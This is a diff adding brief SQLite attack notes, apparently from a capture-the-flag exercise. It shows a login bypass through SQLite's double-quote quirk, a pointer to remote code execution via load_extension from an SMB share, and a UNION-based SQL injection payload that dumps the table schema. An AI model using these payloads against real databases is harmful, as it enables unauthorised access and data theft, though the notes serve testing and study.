@@ -1,0 +1,25 @@
+# sqlite
+
+# double-quotes https://sqlite.org/lang_keywords.html
+sqlite3 web500.sqlite
+CREATE TABLE USERS(
+   ID INT PRIMARY KEY     NOT NULL,
+   LOGIN          TEXT    NOT NULL,
+   PASSWORD       TEXT    NOT NULL
+);
+INSERT INTO USERS (ID, LOGIN, PASSWORD) VALUES(1, 'root', 'p@ssw0Rd!');
+sqlite> select * from users;
+1|root|p@ssw0Rd!
+sqlite> select * from users where login = 'admin' and password = 'asdfasdf';
+sqlite> select * from users where login = 'root' and password = "password";
+1|root|p@ssw0Rd!
+sqlite> ^D
+
+# rce options
+https://www.sqlite.org/lang_corefunc.html#load_extension (can have extension on an smb share)
+
+# check integrity
+sqlite3 blah.sqlite "PRAGMA integrity_check"
+
+# sqli
+union select sql from sqlite_master where type = 'table' -- -
